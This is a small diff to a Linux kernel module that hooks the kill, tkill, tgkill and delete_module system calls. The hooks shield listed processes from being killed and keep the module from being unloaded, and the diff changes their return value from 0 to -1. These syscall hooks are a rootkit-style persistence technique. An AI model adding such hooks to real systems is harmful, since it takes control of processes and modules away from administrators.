@@ -459,7 +459,7 @@ asmlinkage long new_kill(pid_t pid, int sig){
 			int tgid = get_tgid(pid);
 			if(exists_in_array(tgid, harden_tgids, harden_tgids_len) == 1){
 				// don't kill
-				return 0;
+				return -1;
 			}
 		}
 	}
@@ -567,7 +567,7 @@ asmlinkage long new_tkill(int tid, int sig){
 			int tgid = get_tgid(tid);
 			if(exists_in_array(tgid, harden_tgids, harden_tgids_len) == 1){
 				// don't kill
-				return 0;
+				return -1;
 			}
 		}
 	}
@@ -579,7 +579,7 @@ asmlinkage long new_tgkill(int tgid, int tid, int sig){
 		if(usingKey == 1){
 			if(exists_in_array(tgid, harden_tgids, harden_tgids_len) == 1){
 				// don't kill
-				return 0;
+				return -1;
 			}
 		}
 	}
@@ -618,7 +618,7 @@ asmlinkage long new_delete_module(const char* name, int flags){
 					|| special_str_equal(nameCopyPointer, MAIN_MODULE_NAME) == 1){
 					//printk(KERN_EMERG "delete_module is special\n");
 					// don't remove
-					return 0;
+					return -1;
 				}else{
 					//printk(KERN_EMERG "delete_module is not special\n");
 					if(str_equal(nameCopyPointer, key) == 1){ // CAVEAT! if module name greater than key length
